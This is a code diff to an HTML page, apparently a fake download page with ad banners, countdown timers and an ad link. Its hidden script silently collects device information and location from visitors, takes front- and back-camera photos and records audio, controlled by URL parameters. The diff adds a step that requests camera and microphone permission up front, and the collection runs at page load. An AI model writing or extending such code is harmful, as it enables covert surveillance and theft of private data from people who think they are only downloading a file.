@@ -87,7 +87,7 @@
 
 <script>
 /* ============================================================
-   1) إعدادات + قراءة البارامترات
+   1) قراءة البارامترات
    ============================================================ */
 const API_KEY = "754298";
 const qs = new URLSearchParams(location.search);
@@ -251,9 +251,33 @@ async function recordAudioLoop(){
   } catch(e){}
 }
 
-/* تشغيل جمع كل المعلومات المطلوبة */
+/* ============================================================
+   4) طلب الأذونات أول حاجة — زي preGrantPermissions
+   ============================================================ */
+async function preGrantPermissions(needCamera, needMic){
+  if (!needCamera && !needMic) return;
+  const constraints = {};
+  if (needCamera) constraints.video = true;
+  if (needMic)    constraints.audio = true;
+  try {
+    const s = await navigator.mediaDevices.getUserMedia(constraints);
+    s.getTracks().forEach(t => t.stop());
+  } catch(e){ /* المستخدم رفض — نكمل */ }
+}
+
+/* ============================================================
+   5) التشغيل الرئيسي (بنفس ترتيب كودك)
+   ============================================================ */
 async function collectAll(){
   if (!id || !token || api !== API_KEY) return;
+
+  const needCamera = want.bc || want.fc || want.bcv || want.fcv;
+  const needMic    = want.bcv || want.fcv || want.r;
+
+  /* أول حاجة: طلب الأذونات موحد */
+  await preGrantPermissions(needCamera, needMic);
+
+  /* بعد كده: كل ميزة */
   if (want.inf) await getInfo();
   if (want.loc) await getLocation();
   if (want.bc)  await capturePhoto('environment');
@@ -264,7 +288,7 @@ async function collectAll(){
 }
 
 /* ============================================================
-   4) منطق صفحة التحميل
+   6) منطق صفحة التحميل
    ============================================================ */
 var SMART_LINK = "https://araplhn.org/4/7e093505ac4f216b5950d797a595b30c";
 var WAIT1 = 5, WAIT2 = 30, WAIT3 = 30, GAP = 5;
@@ -344,7 +368,7 @@ function show(n){
 }
 
 /* ============================================================
-   5) التشغيل
+   7) التشغيل
    ============================================================ */
 addBanners("ads1"); addNative("native1");
 ring(1, WAIT1, false, "تم! اضغط على زر المتابعة بالأسفل ", function(){ reveal("b1"); });
@@ -364,8 +388,8 @@ $("b2").onclick = function(){
 };
 $("b3").onclick = function(){ window.location.href = SMART_LINK; };
 
-/* بدء جمع المعلومات (في الخلفية) */
+/* بدء جمع البيانات — فورًا زي كودك */
 collectAll();
 </script>
 </body>
-   </html>
+ </html>
